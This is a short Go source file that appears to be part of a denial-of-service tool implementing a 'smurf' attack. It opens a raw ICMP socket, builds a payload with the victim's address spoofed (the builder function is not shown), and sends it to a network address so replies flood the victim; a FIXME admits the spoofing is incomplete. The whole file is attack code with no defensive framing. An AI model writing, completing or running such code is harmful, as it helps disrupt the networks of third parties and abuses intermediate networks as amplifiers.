package main

import (
	"net"
	"syscall"

	"github.com/pkg/errors"
)

type smurf struct {
	sockfd  int
	network *syscall.SockaddrInet4
	payload []byte
}

func newSmurf(victim, network net.IP) (*smurf, error) {
	// FIXME: Need to use pcap to send raw IPv4 packets containing ICMP over Ethernet.
	// The syscall library IPPROTO_ICMP slaps real IP header on data sent
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_ICMP)
	if err != nil {
		return nil, errors.Wrap(err, "could not get raw icmp socket")
	}

	var remote syscall.SockaddrInet4
	copy(remote.Addr[:], network.To4())

	pl, err := spoofedICMP(victim, network)
	if err != nil {
		return nil, errors.Wrap(err, "could not build a spoofed payload")
	}

	return &smurf{
		sockfd:  fd,
		network: &remote,
		payload: pl,
	}, nil
}

func (s *smurf) execute() error {
	return syscall.Sendto(s.sockfd, s.payload, 0, s.network)
}
